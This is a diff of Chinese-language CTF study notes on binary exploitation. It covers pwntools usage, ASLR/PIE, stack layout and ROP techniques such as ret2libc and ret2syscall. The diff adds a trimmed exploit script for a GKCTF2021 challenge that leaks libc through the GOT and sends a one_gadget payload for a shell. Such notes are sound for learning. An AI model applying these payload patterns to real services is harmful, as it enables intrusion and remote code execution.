@@ -127,33 +127,61 @@ Installation:
 > docs: https://docs.pwntools.com/en/latest/
 
 - pwn工具集. `pwntools` is a CTF framework and exploit development library. CTF框架，python包
-- WARNING: 网上很多使用pwntools的脚本是基于python2的，需要注意str byte转换，以及可能存在的API行为改变
+- WARNING: 网上很多使用pwntools的脚本是基于python2的，需要注意str byte转换，以及可能存在的API名称/行为改变
 
 ```python
 from pwn import *
 context.log_level = "DEBUG"
-io = remote("127.0.0.1", 32152)
-# 与互联网主机交互
-io.sendline("hello") # sendline发送数据会在最后多添加一个回车
-io.send("hello") # 不会添加回车
+context.binary = ""./pwny" # print(context)
 
-io.recv(1024) # 读取1024个字节
-io.recvuntil() # 读取一直到回车
-io.recvline("hello") # 读取到指定数据
+# ===== 连接
+sh = remote("127.0.0.1", 32152) # 与互联网主机交互
+sh = process("./bin", shell=True) # 启动本地程序进行交互，用于gdb调试
+sh = process("./bin")  # , env={'LD_PRELOAD': './libc.so.6'}
+# process(['ld.so','pwn'],env=xxx)
 
-io.interactive()
+
+# =====elf 
+libc = ELF("./libc.so.6")
+elf = ELF("./login")
+
+
+# ===== 发送
+sh.send("hello") # 不会添加回车
+sh.sendline("hello") # sendline发送数据会在最后多添加一个回车
+sh.sendafter(">", payload) # 在接收到 > 后发送
+
+
+# ===== 接收
+sh.recv(1024) # 读取1024个字节
+
+sh.recvuntil() # 读取一直到回车
+sh.recvuntil("end\n") # 读取一直到 end\n
+sh.recvuntil(b' ', drop=True) # b'331'
+
+sh.recvline()
+sh.recvline(timeout=1) # 超时为1s
+sh.recvline("hello") # 读取到指定数据
+sh.recvline(keepends=False) # 不保存尾部截断字符
+
+sh.interactive()
 ```
 
 
 
 ```python
-io = process("./bin", shell=True) # 启动本地程序进行交互，用于gdb调试
-
-io.p32(0xdeadbeef)
-io.p64(0xdeadbeefdeadbeef)
-io.u32("1234")
-io.u64("12345678")
+sh.p32(0xdeadbeef)
+sh.p64(0xdeadbeefdeadbeef)
+sh.u32("1234")
+sh.u64("12345678")
 # 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword
+addr_puts = u64(sh.recvline(keepends=False).ljust(8, b'\0')) # 64bit OS接收函数地址 补全 转换
+
+import struct
+p32(0xdeadbeef) == struct.pack('I', 0xdeadbeef) # True # 两者等效
+leet = unhex('37130000')
+u32(b'abcd') == struct.unpack('I', b'abcd')[0] # True # 两者等效
+u8(b'A') == 0x41 # True # 两者等效
 ```
 
 - Installation: 
@@ -169,8 +197,6 @@ python3 -m pip install --upgrade pwntools
 
 
 
-### Tutorials
-
 > https://docs.pwntools.com/en/latest/intro.html
 >
 > 使用`from pwn import *`后，quick list of most of the objects and routines imported: https://docs.pwntools.com/en/latest/globals.html
@@ -179,43 +205,7 @@ python3 -m pip install --upgrade pwntools
 
 
 
-#### Connections
-
-```python
-# 创建远程连接，
-conn = remote('ftp.ubuntu.com', 21) # in pwnlib.tubes.remote # 域名/IP, Port
-conn.recvline() # doctest: +ELLIPSIS # b'220 ...'
-conn.send(b'USER anonymous\r\n') # 需要手动添加\r\n
-conn.recvuntil(b' ', drop=True) # b'331'
-conn.recvline() # b'Please specify the password.\r\n'
-conn.close()
-```
-
-```python
-# spin up a listener
-l = listen() # 创建一个sock用于监听
-r = remote('localhost', l.lport) # 连接刚刚创建的连接l的监听端口 lport
-c = l.wait_for_connection() # 等待连接
-r.send(b'hello')
-c.recv() # b'hello'
-```
-
-```python
-# Interacting with processes # 与进程交互
-sh = process('/bin/sh') # pwnlib.tubes.process
-gdb.attach(sh)
-sh.sendline(b'sleep 3; echo hello world;') # 会自动添加\r\n
-sh.recvline(timeout=1) # b'' # 因为上面执行的命令首先为sleep 3，这里超时后未接收到字符串
-sh.recvline(timeout=5) # b'hello world\n'
-sh.close()
-```
-
-```python
-# Not only can you interact with processes programmatically, but you can actually interact with processes.
->>> sh.interactive() # doctest: +SKIP # 将代码交互转换为手工交互
-$ whoami
-user
-```
+### Connections
 
 
 
@@ -235,29 +225,7 @@ shell.close()
 
 
 
-#### Packing Integers
-
-- 在python表示的整数和字节序列表示之间转换
-
-```python
-import struct
-p32(0xdeadbeef) == struct.pack('I', 0xdeadbeef) # True # 两者等效
-leet = unhex('37130000')
-u32(b'abcd') == struct.unpack('I', b'abcd')[0] # True # 两者等效
-u8(b'A') == 0x41 # True # 两者等效
-```
-
-
-
-#### Target Architecture, OS, Logging
-
-```python
-context.binary = './challenge-binary' # 自动设置所有适当的值 # 官方文档推荐方法
-print(context) # example output:
-# ContextType(arch = 'i386', binary = ELF('/home/kali/CTF/pwn/ret2shellcode'), bits = 32, endian = 'little', os = 'linux')
-```
-
-
+### Target Architecture, OS, Logging, Assembly
 
 ```python
 asm('nop') # b'\x90'
@@ -282,8 +250,6 @@ context.log_level = 'debug'
 log.success("ret_addr:" + hex(ret_addr)) # success logging 
 ```
 
-#### Assembly and Disassembly
-
 > `pwnlib.asm`
 
 ```python
@@ -300,7 +266,7 @@ print(disasm(unhex('6a0258cd80ebf9'))) # machine code to readable assembly
 
 
 
-#### ELF Manipulation
+### ELF Manipulation
 
 ```python
 e = ELF('/bin/cat')
@@ -321,6 +287,34 @@ disasm(open('/tmp/quiet-cat','rb').read(1))
 
 
 ### Cases
+
+> 这里列举的代码通常去掉了很多功能重复的语句，一般无法直接运行也无法解题
+
+```python
+from pwn import *   # ROP_double_leave_tiny_rop_GKCTF2021_checkin # truncated
+
+context.log_level = "DEBUG"
+context.binary = './login'
+# sh = process("./login")  # , env={'LD_PRELOAD': './libc.so.6'}
+# process(['ld.so','pwn'],env=xxx)
+sh = remote("node3.buuoj.cn", 27490)
+libc = ELF("./libc.so.6")
+elf = ELF("./login")
+gdb.attach(sh, "b *(0x401972)\nb *(0x40191C)\nc")
+
+payload = b"admin\0".ljust(0x8, b'\0') + p64(0x401ab3) + p64(elf.got['puts']) + p64(0x4018B5)
+sh.sendafter(">", payload)
+
+data = sh.recvuntil("GeBai\n")
+addr_puts = u64(sh.recvline(keepends=False).ljust(8, b'\0')) # 注意这里接收64bit系统函数地址后的操作
+libc.address = addr_puts - libc.sym['puts']
+print("libc.address =", hex(libc.address))
+
+payload = b"admin\0".ljust(0x18, b'\0') + p64(libc.address + 0xf1247) # one_gadget: 0x45226 0x4527a 0xf03a4 0xf1247
+sh.sendafter(">", payload)
+
+sh.interactive()
+```
 
 
 
@@ -377,7 +371,7 @@ ROPgadget --binary ret2baby  --string "/bin/sh" # 获得 /bin/sh 字符串对应
 > Linux系统上控制ASLR启动与否
 
 - ASLR通过**随机放置进程关键数据区域的地址空间**来防止攻击者能可靠地跳转到内存的特定位置来利用函数。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行**Return-to-libc**攻击
-- ASLR 的有效性依赖于整个地址空间布局是否对于攻击者保持未知。只有编译时作为 位置无关可执行文件(Position Independent Executable)（PIE）的可执行程序才能得到 ASLR 技术的最大保护，因为只有这样，可执行文件的所有代码节区才会被加载在随机地址。PIE 机器码不管绝对地址是多少都可以正确执行。
+- ASLR 的有效性依赖于整个地址空间布局是否对于攻击者保持未知。只有编译时作为 位置无关可执行文件(Position Independent Executable) **PIE** 的可执行程序才能得到 ASLR 技术的最大保护，因为只有这样，可执行文件的所有代码节区才会被加载在随机地址。PIE 机器码不管绝对地址是多少都可以正确执行。
 
 
 
@@ -804,7 +798,9 @@ intel系统中栈是向下生长的(栈越扩大其值越小,堆恰好相反)
 
 通过固定的地址与偏移量来寻找在栈参数与变量，EBP寄存器存放的就是固定的地址。但是这个值在函数调用过程中会变化，函数执行结束后需要还原，因此要在函数的出栈入栈中进行保存
 
-## Order 入栈顺序
+## Push Order
+
+> 入栈顺序
 
 以**Windows/Intel**为例，通常当函数调用发生时，数据将以以下方式存储在栈中：
 
@@ -1141,8 +1137,7 @@ sh.interactive() # 将代码交互转换为手工交互
 
 
 
-
-### ROP
+## ROP
 
 > ROP(Return Oriented Programming)   面向返回编程    栈溢出问题
 >
@@ -1171,7 +1166,14 @@ sh.interactive() # 将代码交互转换为手工交互
 
 
 
-#### ret2text
+Important Cases:
+
+- ROP_bamboofox_ret2syscall: 案例小巧简单，但是payload需要精心构造，多次rop，适合学习rop构造方法，rsp变化过程
+- 
+
+
+
+### ret2text
 
 > return to .text of the executable program
 >
@@ -1218,7 +1220,7 @@ sh.interactive() # 将代码交互转换为手工交互
 
 
 
-#### ret2shellcode
+### ret2shellcode
 
 - 控制程序执行shellcode代码（例如sh）
 - shellcode: 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell
@@ -1231,7 +1233,7 @@ sh.interactive() # 将代码交互转换为手工交互
 
 
 
-#### ret2syscall
+### ret2syscall
 
 - 控制程序执行系统调用(system call)，获取 shell
 - Linux 系统调用号：`/usr/include/asm/unistd.h`
@@ -1262,7 +1264,7 @@ sh.interactive() # 将代码交互转换为手工交互
 
 
 
-#### ret2libc
+### ret2libc
 
 > https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html 
 >
